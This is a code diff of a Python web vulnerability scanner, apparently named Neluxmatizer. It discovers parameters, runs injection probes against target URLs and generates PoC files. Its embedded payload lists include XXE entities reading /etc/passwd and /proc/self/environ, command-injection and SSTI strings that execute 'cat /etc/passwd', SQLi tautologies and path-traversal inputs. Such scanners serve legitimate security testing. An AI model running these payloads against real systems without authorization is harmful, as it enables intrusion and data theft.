@@ -1,187 +1,724 @@
-from parametizer.params import parametizer,parametizer2, parametizer3
 from scanners.scan_crlf import crlf    
-from scanners.scan_xss import xss,xss_forms, xss_params
-from scanners.scan_lfi import lfi, lfi_params
-from scanners.scan_sqli import sqli, sqli_params
+from scanners.scan_lfi import lfi
 from scanners.scan_xxe import xxe
+from parametizer.core.save_it import save_output
+from scanners.scan_redirect import redirect
+from scanners.scan_ssrf import ssrf
+from scanners.scan_ssti import ssti
 from scanners.scan_clickjacking import clickjacking
 from scanners.scan_cors import cors
-from parametizer.core.save_it import save_output
-import sys,os ,requests
-from urllib.request import urlopen
-from urllib.error import URLError, HTTPError
-import random
-from scanners.scan_idor import idor
-from scanners.scan_rce import rce, rce_params
-from scanners.scan_redirect import redirect, redirect_params
-from scanners.scan_lfi import lfi, lfi_params
-from scanners.scan_ssrf import ssrf, ssrf_params
-from scanners.scan_ssti import ssti, ssti_params
+from scanners.scan_xss import xss
+from scanners.scan_sqli import sqli
+from scanners.scan_rce import rce
+from parametizer.params import parametizer
+from parametizer.params_p import parametizer_params
+from parametizer.params_f import parametizer_forms
+import sys
+import os
+import re
+import os
+import time
 
-def all_list(l,c,cl,cr,x,xe,lf,s,i,r,rc,sr,sst,output,output2,fname,o,vulnerables_urls,op,params,threads,word_list):   
- indice=0
- 
- while indice < len(l):
-     
-     linea=l[indice]
-     menssaje= f" | Scanning {indice + 1} of {len(l)} |"    
-     print()
-     print('-'*len(linea) + '-'* len(menssaje)+ '--')
-     print("| "+"\033[1;36m" + linea + '\033[0;m'+ menssaje )
-     print('-'*len(linea) + '-'* len(menssaje) + '--')
-     print()
-     try:
-          
-         uri=[]
-         uri2=[]
-         uri.append(linea)
-         uri2.append(linea)
-         print('\033[1;33mSearch endpoints and parameters:\n\033[0m')
-         parametizer(linea,output,threads)
-         try:
-             with open(output, "r") as f:
-                 for q in f.readlines():
-                     q = q.strip()
-                     if q == "" or q.startswith("#"):
-                         pass
-                     uri.append(q)
-         except:
-             pass
-         parametizer3(linea,output2,threads)
-         try:
-             with open(output2, "r") as ff:
-                 for qq in ff.readlines():
-                     qq = qq.strip()
-                     if qq == "" or qq.startswith("#"):
-                         pass
-                     uri2.append(qq)                                                                                                                               
-         except:
-                 pass
-         print(f"\033[1;32m[+] Total urls found : {(len(uri)-1)+len(uri2)}\033[1;31m")
+# Importar el sistema de manejo de bloqueos
+try:
+    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+    from core.block_handler import BlockHandler, ResultSaver, create_safe_request_session
+    from colorama import Style
+    BLOCK_HANDLER_AVAILABLE = True
+except ImportError:
+    BLOCK_HANDLER_AVAILABLE = False
+    sys.stdout.write('\033[1;33m[⚠️] Block handler not available - continuing without WAF protection\033[0m\n')
+sys.stdout.flush()
 
-         if cl:    
-             clickjacking(uri2,vulnerables_urls,threads)
-         if c:           
-             cors(uri2,vulnerables_urls,threads)
-         if x:
-             if len(word_list) == 0:
-                 wordlist=['"><script>confirm(1)</script>','<h1>NELUXMATIZER</h1>']
-             else:
-                 wordlist=word_list
-             if op:
-                     xss_params(uri,params,threads)
-             else:                                             
-                     print()        
-                     print('\033[1;33mTest xss for default payload:\033[0m')       
-                     xss(uri,wordlist,vulnerables_urls,threads)
-                     xss_forms(uri2,wordlist,vulnerables_urls)                              
-         if xe:
-              print()
-              print('\033[1;33mTest xxe for default payload:\033[0m')       
-              xxe(uri2,vulnerables_urls,threads)              
 
-         if s:
-             if len(word_list) == 0:
-                 wordlist=["%27"]
-             else:
-                 wordlist=word_list                        
-             if op:
-                     sqli_params(uri2,params,threads)
-             else:                                     
-                     print()        
-                     print('\033[1;33mTest sqli for default payload:\033[0m')
-                     print()        
-                     sqli(uri,wordlist,vulnerables_urls,threads)           
-
-         if i and op:
-             wordlist=['']   
-             print()        
-             print('\033[1;33mSearch idor parameters:\033[0m')
-             print()        
-             idor(uri,params,threads)           
+def generate_pocs_for_domain(domain_vulnerabilities, domain, oob_domain=None):
+    """Genera PoCs para un dominio específico con nombres basados en el dominio"""
     
-         if rc:
-             wordlist=['| ipconfig /all','; ipconfig /all','& ipconfig /all','| ifconfig',
-             '& ifconfig', '; ifeconfig','&& ifconfig','system("cat /etc/passwd");','system("cat /etc/passwd");'
-             ]
-             if op:
-                     rce_params(uri,params,threads)
-             else:                                             
-                     print()        
-                     print('\033[1;33mTest rce for default payload:\033[0m')       
-                     rce(uri,wordlist,vulnerables_urls,threads)  
+    try:
+        from poc_generator import PoCGenerator
+        poc_gen = PoCGenerator()
+        sys.stdout.write(f"✅ PoC Generator inicializado para dominio: {domain}\n")
+        sys.stdout.flush()
+        
+        # Contadores por tipo de vulnerabilidad
+        poc_count = 0
+        
+        # Generar UN PoC por tipo de vulnerabilidad para este dominio
+        for vuln_type, vulns in domain_vulnerabilities.items():
+            if vulns:
+                try:
+                    if vuln_type == 'CLICKJACKING':
+                        sys.stdout.write(f"\n🔍 Generating PoC for Clickjacking: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_clickjacking_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'XSS':
+                        sys.stdout.write(f"\n🔍 Generating PoC for XSS: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_xss_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'SQLI':
+                        sys.stdout.write(f"\n🔍 Generating PoC for SQLi: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_sqli_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'LFI':
+                        sys.stdout.write(f"\n🔍 Generating PoC for LFI: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_lfi_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'RCE':
+                        sys.stdout.write(f"\n🔍 Generating PoC for RCE: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_rce_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'SSRF':
+                        sys.stdout.write(f"\n🔍 Generating PoC for SSRF: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_ssrf_poc(vulns, domain=domain, oob_domain=oob_domain)
+                        
+                    elif vuln_type == 'SSTI':
+                        sys.stdout.write(f"\n🔍 Generating PoC for SSTI: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_ssti_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'XXE':
+                        sys.stdout.write(f"\n🔍 Generating PoC for XXE: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_xxe_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'CRLF':
+                        sys.stdout.write(f"\n🔍 Generating PoC for CRLF: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_crlf_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'CORS':
+                        sys.stdout.write(f"\n🔍 Generating PoC for CORS: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_cors_poc(vulns, domain=domain)
+                        
+                    elif vuln_type == 'REDIRECT':
+                        sys.stdout.write(f"\n🔍 Generating PoC for Open Redirect: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_redirect_poc(vulns, domain=domain)
+                    
+                    # Procesar resultado
+                    if result.get('html_filename'):
+                        sys.stdout.write(f"✅ {vuln_type} PoC generado: {result['html_filename']}\n")
+                        sys.stdout.flush()
+                        poc_count += 1
+                    else:
+                        sys.stdout.write(f"❌ Error: {result.get('error', 'Unknown error')}\n")
+                        sys.stdout.flush()
+                        
+                except Exception as e:
+                    sys.stdout.write(f"❌ Error generating {vuln_type} PoC: {e}\n")
+                    sys.stdout.flush()
+        
+        sys.stdout.write(f"\n✅ Generated {poc_count} PoC files for domain: {domain}\n")
+        sys.stdout.flush()
+        
+    except Exception as e:
+        sys.stdout.write(f"❌ Error in PoC generation for domain {domain}: {e}\n")
+        sys.stdout.flush()
 
-         if r: 
-             wordlist=['////google.com/','https:///google.com/','/https:google.com','<>javascript:alert(1);','http:///////////google.com','javascript:alert(1)']
-             if op:
-                         redirect_params(uri,params,threads)
-             else:                                           
-                         print()        
-                         print('\033[1;33mTest redirect for default payload:\033[0m')       
-                         redirect(uri,wordlist,vulnerables_urls,threads)           
-             
-         if sr:
-             wordlist=['file:///etc/passwd','file://\/\/etc/passwd']   
-             if op:
-                     ssrf_params(uri,params,threads)
-             else:                                     
-                     print()        
-                     print('\033[1;33mTest SSRF for default payloads:\033[0m')
-                     print()        
-                     ssrf(uri,wordlist,vulnerables_urls,threads)           
-             
-         if lf:
-             if len(word_list) == 0:
-                 wordlist=['../../../../../../../../../../../../../../../../../../../../../../etc/passwd']
-             else:
-                 wordlist=word_list                                
-             if op:
-                     lfi_params(uri,params,threads)
-             else:
-                     print()        
-                     print('\033[1;33mTest lfi for default payload:\033[0m')
-                     print()        
-                     lfi(uri,wordlist,vulnerables_urls,threads)           
-             
-         if sst:
-             wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
-             if op:
-                     ssti_params(uri,params,threads)
-             else:
-                     print()        
-                     print('\033[1;33mTest ssti for default payloads:\033[0m')
-                     print()        
-                     ssti(uri,wordlist,vulnerables_urls,threads)           
-         try:
-             if cr:
-                 print()
-                 print('\033[1;33mTest crlf for default payload:\033[0m')       
-                 crlf(uri2,vulnerables_urls,threads)    
-         except:
-              indice+=1
-              continue                
-     except:
-         print()
-         print("\033[1;36m"+" CLOSE PROGRAM " + '\033[0;m')
-         indice=len(l)+1
-         pass     
-                 
-     if o:
-         save_output(vulnerables_urls,fname,linea)
-         if "/" in fname:        
-               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36m{fname}\u001b[31m" )
-         else:
-               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36moutput/{fname}\u001b[31m" )
-     if op:
-         save_output(params,fname,linea)
-         if "/" in fname:        
-               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36m{fname}\u001b[31m" )
-         else:
-               print(f"\u001b[32m[+] Output is saved here :\u001b[31m \u001b[36moutput/{fname}\u001b[31m" )
+
+def generate_pocs_for_vulnerabilities(vulnerabilities_by_type, target_url, result_saver=None, oob_domain=None):
+    """Genera PoCs para todas las vulnerabilidades encontradas - UN PoC por tipo de vulnerabilidad"""
     
-     indice+= 1
-     
+    try:
+        from poc_generator import PoCGenerator
+        poc_gen = PoCGenerator()
+        sys.stdout.write(f"✅ PoC Generator inicializado para {target_url}\n")
+        sys.stdout.flush()
+        
+        # Contadores por tipo de vulnerabilidad
+        poc_count = 0
+        generated_pocs = set()  # Para evitar generar PoCs duplicados
+        
+        # Generar UN PoC por tipo de vulnerabilidad
+        for vuln_type, vulns in vulnerabilities_by_type.items():
+            if vulns and vuln_type not in generated_pocs:
+                generated_pocs.add(vuln_type)
+                
+                # Usar todas las vulnerabilidades de este tipo para generar el PoC
+                try:
+                    if vuln_type == 'CLICKJACKING':
+                        sys.stdout.write(f"\n🔍 Generating PoC for Clickjacking: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_clickjacking_poc(vulns)
+                        
+                    elif vuln_type == 'XSS':
+                        sys.stdout.write(f"\n🔍 Generating PoC for XSS: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_xss_poc(vulns)
+                        
+                    elif vuln_type == 'SQLI':
+                        sys.stdout.write(f"\n🔍 Generating PoC for SQLi: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_sqli_poc(vulns)
+                        
+                    elif vuln_type == 'LFI':
+                        sys.stdout.write(f"\n🔍 Generating PoC for LFI: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_lfi_poc(vulns)
+                        
+                    elif vuln_type == 'RCE':
+                        sys.stdout.write(f"\n🔍 Generating PoC for RCE: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_rce_poc(vulns)
+                        
+                    elif vuln_type == 'SSRF':
+                        sys.stdout.write(f"\n🔍 Generating PoC for SSRF: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_ssrf_poc(vulns, oob_domain=oob_domain)
+                        
+                    elif vuln_type == 'SSTI':
+                        sys.stdout.write(f"\n🔍 Generating PoC for SSTI: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_ssti_poc(vulns)
+                        
+                    elif vuln_type == 'XXE':
+                        sys.stdout.write(f"\n🔍 Generating PoC for XXE: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_xxe_poc(vulns)
+                        
+                    elif vuln_type == 'CRLF':
+                        sys.stdout.write(f"\n🔍 Generating PoC for CRLF: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_crlf_poc(vulns)
+                        
+                    elif vuln_type == 'CORS':
+                        sys.stdout.write(f"\n🔍 Generating PoC for CORS: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_cors_poc(vulns)
+                        
+                    elif vuln_type == 'REDIRECT':
+                        sys.stdout.write(f"\n🔍 Generating PoC for Open Redirect: {len(vulns)} URLs\n")
+                        sys.stdout.flush()
+                        result = poc_gen.generate_redirect_poc(vulns)
+                    
+                    # Procesar resultado
+                    if result.get('html_filename'):
+                        sys.stdout.write(f"✅ {vuln_type} PoC generado: {result['html_filename']}\n")
+                        sys.stdout.flush()
+                        poc_count += 1
+                        if result_saver:
+                            result_saver.add_vulnerability(first_vuln, target_url)
+                    else:
+                        sys.stdout.write(f"❌ Error: {result.get('error', 'Unknown error')}\n")
+                        sys.stdout.flush()
+                        
+                except Exception as e:
+                    sys.stdout.write(f"❌ Error generating {vuln_type} PoC: {e}\n")
+                    sys.stdout.flush()
+        
+        sys.stdout.write(f"\n✅ Generated {poc_count} PoC files\n")
+        sys.stdout.flush()
+        
+    except Exception as e:
+        sys.stdout.write(f"❌ Error in PoC generation: {e}\n")
+        sys.stdout.flush()
 
 
+def all_list(urls, c, cl, cr, x, xe, l, s, r, rc, sr, sst, fname, o,
+             urls_vulnerables, threads, payloads, custom_headers, random_agent, oob_domain=None, poc=False, cookies=None, auth_token=None):
+
+    # Contadores para el reporte final
+    total_urls = len(urls)
+    processed_urls = 0
+    blocked_urls = 0  # Solo se incrementa cuando realmente se bloquea durante ataques
+    bypassed_urls = 0  # Solo se incrementa cuando se logra bypass durante ataques
+    safe_urls = 0      # Solo se incrementa cuando no hay WAF o no se bloquea
+    
+    # Diccionario para organizar vulnerabilidades por tipo
+    vulnerabilities_by_type = {
+        'XSS': [],
+        'SQLI': [],
+        'LFI': [],
+        'RCE': [],
+        'SSRF': [],
+        'SSTI': [],
+        'XXE': [],
+        'CRLF': [],
+        'CORS': [],
+        'CLICKJACKING': [],
+        'REDIRECT': []
+    }
+    
+    # 🔒 BLOCK HANDLER SYSTEM
+    block_handlers = {}  # Un handler por URL
+    result_savers = {}   # Un saver por URL
+    
+    # Inicializar handlers para cada URL
+    for url in urls:
+        if BLOCK_HANDLER_AVAILABLE:
+            block_handlers[url] = BlockHandler(url, custom_headers)
+            if o:  # Solo si hay output habilitado
+                result_savers[url] = ResultSaver(fname, poc)
+        else:
+            block_handlers[url] = None
+            result_savers[url] = None
+
+    for u in urls:
+        processed_urls += 1
+        sys.stdout.write(f'\033[1;36m[+] Scanning {u} ({processed_urls}/{total_urls})\033[0m\n')
+        sys.stdout.flush()
+        
+        # 🔐 AUTHENTICATION MANAGEMENT
+        auth_manager = None
+        if cookies or auth_token:
+            try:
+                from parametizer.core.auth_manager import AuthManager
+                auth_manager = AuthManager(cookies, auth_token)
+                sys.stdout.write(f'\033[1;32m[+] Authentication enabled: {auth_manager.get_auth_info()}\033[0m\n')
+                sys.stdout.flush()
+            except ImportError:
+                sys.stdout.write(f'\033[1;33m[!] Auth manager not available - continuing without authentication\033[0m\n')
+                sys.stdout.flush()
+        else:
+            sys.stdout.write(f'\033[1;33m[!] No authentication provided - running unauthenticated scan\033[0m\n')
+            sys.stdout.flush()
+        
+        # 🔒 WAF DETECTION (INFORMATIVA SOLO - NO BLOQUEA)
+        try:
+            # Importar el detector de WAF
+            sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+            from core.waf_detector import WAFDetector
+            
+            #print(f'\033[1;33m[🔍] Checking WAF protection (informative only)...\033[0m')
+            waf_detector = WAFDetector(u, custom_headers)
+            
+            # Detectar WAF silenciosamente (solo informativo, no bloquea)
+            waf_detector.detect_waf()
+            # Solo mostrar cuando NO hay WAF o cuando realmente bloquee
+            if not waf_detector.waf_detected:
+                sys.stdout.write(f'\033[1;32m[+] No WAF detected\033[0m\n')
+                sys.stdout.flush()
+            # Si hay WAF detectado, no imprimimos nada aquí
+            # El reporte solo aparecerá si realmente nos bloquea durante los ataques
+                
+        except ImportError:
+            sys.stdout.write(f'\033[1;33m[⚠️] WAF detector not available - continuing without WAF protection\033[0m\n')
+            sys.stdout.flush()
+        except Exception as e:
+            sys.stdout.write(f'\033[1;33m[⚠️] WAF detection error: {e} - continuing scan\033[0m\n')
+            sys.stdout.flush()
+        
+        uri = parametizer(u, None, threads)
+        urip = parametizer_params(uri, output_file=None)
+        urif = parametizer_forms(uri, output_file=None, threads=threads)
+
+        # 🔍 ADVANCED PARAMETER DISCOVERY (Arjun-like)
+        try:
+            sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+            from parametizer.param_discovery import ParameterDiscovery
+            
+            sys.stdout.write(f'\033[1;33m[+] Starting advanced parameter discovery...\033[0m\n')
+            sys.stdout.flush()
+            
+            # Usar headers autenticados si están disponibles
+            discovery_headers = custom_headers
+            if auth_manager and auth_manager.is_authenticated():
+                discovery_headers = auth_manager.get_session_headers(custom_headers)
+                sys.stdout.write(f'\033[1;32m🔐 Using authenticated headers for parameter discovery\033[0m\n')
+                sys.stdout.flush()
+            
+            param_discovery = ParameterDiscovery(u, discovery_headers, max_threads=threads)
+            
+            # Discover parameters
+            discovered_params = param_discovery.discover_parameters()
+            
+            if discovered_params:
+                # Generate URLs with discovered parameters
+                discovered_urls = param_discovery.get_discovered_urls()
+                
+                # Add discovered URLs to existing lists
+                if urip:
+                    urip.extend(discovered_urls)
+                else:
+                    urip = discovered_urls
+                
+                # Limpiar completamente la línea anterior antes de imprimir
+                sys.stdout.write(f'\r\033[K\033[1;32m[+] Advanced discovery found {len(discovered_params)} parameters\033[0m\n')
+                sys.stdout.flush()
+            else:
+                sys.stdout.write(f'\033[1;33m[!] No additional parameters discovered\033[0m\n')
+                sys.stdout.flush()
+                
+        except ImportError:
+            sys.stdout.write(f'\033[1;33m[⚠️] Advanced parameter discovery not available - continuing with basic discovery\033[0m\n')
+            sys.stdout.flush()
+        except Exception as e:
+            sys.stdout.write(f'\033[1;33m[⚠️] Advanced parameter discovery error: {e} - continuing with basic discovery\033[0m\n')
+            sys.stdout.flush()
+
+        if not urip and not urif:
+            sys.stdout.write(f'\n\033[1;31m[-] No parameters found for {u}\033[0m\n')
+            sys.stdout.flush()
+            continue
+
+        sys.stdout.write(f'\033[1;36m[+] Found {len(urip)} URLs with parameters and {len(urif)} forms for {u}\033[0m\n')
+        sys.stdout.flush()
+        print()
+         
+        if cl:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping Clickjacking scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            # Usar headers autenticados para clickjacking
+            scan_headers = custom_headers
+            if auth_manager and auth_manager.is_authenticated():
+                scan_headers = auth_manager.get_session_headers(custom_headers)
+            clickjacking_vulns = clickjacking(urip, urif, [], threads, scan_headers, random_agent)
+            vulnerabilities_by_type['CLICKJACKING'].extend(clickjacking_vulns)
+            urls_vulnerables.extend(clickjacking_vulns)
+        
+        if c:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping CORS scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            # Usar headers autenticados para CORS
+            scan_headers = custom_headers
+            if auth_manager and auth_manager.is_authenticated():
+                scan_headers = auth_manager.get_session_headers(custom_headers)
+            cors_vulns = cors(urip, urif, [], threads, scan_headers, random_agent)
+            vulnerabilities_by_type['CORS'].extend(cors_vulns)
+            urls_vulnerables.extend(cors_vulns)
+
+        if xe:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping XXE scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
+                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>',
+                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///proc/self/environ" >]><foo>&xxe;</foo>',
+                '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]><foo>&xxe;</foo>'
+            ]
+            # Usar headers autenticados para XXE
+            scan_headers = custom_headers
+            if auth_manager and auth_manager.is_authenticated():
+                scan_headers = auth_manager.get_session_headers(custom_headers)
+            xxe_vulns = xxe(urip, urif, wordlist, [], threads, scan_headers, random_agent)
+            vulnerabilities_by_type['XXE'].extend(xxe_vulns)
+            urls_vulnerables.extend(xxe_vulns)
+
+        if x:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping XSS scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                '"><script>confirm(1)</script>',
+                '<h1>NELUXMATIZER</h1>',
+                '<img src=x onerror="alert(1)">'
+            ]
+            xss_vulns = xss(urip, urif, wordlist, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['XSS'].extend(xss_vulns)
+            urls_vulnerables.extend(xss_vulns)
+
+        if l:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping LFI scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                "../../../etc/passwd",
+                "../../../../../../../../../../etc/passwd%00",
+                "/proc/self/environ",
+                "/etc/hosts",
+                "/etc/issue",
+                "/proc/version",
+                "/proc/cmdline",
+                ".htaccess",
+                "Apache listing"
+            ]
+            lfi_vulns = lfi(urip, urif, wordlist, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['LFI'].extend(lfi_vulns)
+            urls_vulnerables.extend(lfi_vulns)
+
+        if s:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping SQLi scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                "%27",
+                "' AND 1=1 -- ",
+                "' AND 1=2 -- ",
+                "' OR 1=1 -- ",
+                "\" OR \"1\"=\"1\" -- "
+            ]
+            sqli_vulns = sqli(urip, urif, wordlist, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['SQLI'].extend(sqli_vulns)
+            urls_vulnerables.extend(sqli_vulns)
+
+        if rc:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping RCE scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                '| ifconfig',
+                '& ifconfig',
+                '&& ifconfig',
+                'system("cat /etc/passwd");',
+                '| echo Neluxmatizer',
+                '; echo Neluxmatizer',
+                '&& echo Neluxmatizer'
+            ]
+            rce_vulns = rce(urip, urif, wordlist, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['RCE'].extend(rce_vulns)
+            urls_vulnerables.extend(rce_vulns)
+
+        if sr:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping SSRF scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                r'file:///etc/passwd',
+                r'file://\/\/etc/passwd',
+                r'http://127.0.0.1'
+            ]
+            ssrf_vulns = ssrf(urip, urif, wordlist, [], threads, custom_headers, random_agent, oob_domain=oob_domain)
+            vulnerabilities_by_type['SSRF'].extend(ssrf_vulns)
+            urls_vulnerables.extend(ssrf_vulns)
+
+        if r:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping Redirect scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                '////google.com/',
+                'https:///google.com/',
+                '/https:google.com',
+                '<>javascript:alert(1);',
+                'http:///////////google.com',
+                'javascript:alert(1)'
+            ]
+            redirect_vulns = redirect(urip, urif, wordlist, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['REDIRECT'].extend(redirect_vulns)
+            urls_vulnerables.extend(redirect_vulns)
+
+        if sst:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping SSTI scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            wordlist = payloads if payloads else [
+                "<%= File.open('/etc/passwd').read %>",
+                "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"
+            ]
+            ssti_vulns = ssti(urip, urif, wordlist, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['SSTI'].extend(ssti_vulns)
+            urls_vulnerables.extend(ssti_vulns)
+
+        if cr:
+            # 🔒 CHECK FOR BLOCKS BEFORE SCANNING
+            if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+                sys.stdout.write(f'\033[1;31m[🚨] Target {u} is blocked - skipping CRLF scan\033[0m\n')
+                sys.stdout.flush()
+                if result_savers[u]:
+                    result_savers[u].save_partial_results(u, "WAF blocking detected during scan")
+                continue
+            
+            crlf_vulns = crlf(urip, urif, [], threads, custom_headers, random_agent)
+            vulnerabilities_by_type['CRLF'].extend(crlf_vulns)
+            urls_vulnerables.extend(crlf_vulns)
+
+        # No generar PoCs aquí - se hará al final para todas las URLs
+        
+        # 🔒 CHECK IF TARGET WAS BLOCKED AND SAVE PARTIAL RESULTS
+        if BLOCK_HANDLER_AVAILABLE and block_handlers[u] and block_handlers[u].is_target_blocked():
+            sys.stdout.write(f'\n\033[1;31m[🚨] Target {u} was blocked during scanning{Style.RESET_ALL}\n')
+            sys.stdout.flush()
+            
+            # Incrementar contador de bloqueos
+            blocked_urls += 1
+            
+            if u in result_savers and result_savers[u]:
+                result_savers[u].save_partial_results(u, f"WAF blocking after {block_handlers[u].block_count} attempts")
+            
+            # Si es la única URL, cerrar el programa
+            if total_urls == 1:
+                sys.stdout.write(f'\n\033[1;31m🚨 Single target blocked - terminating scan{Style.RESET_ALL}\n')
+                sys.stdout.flush()
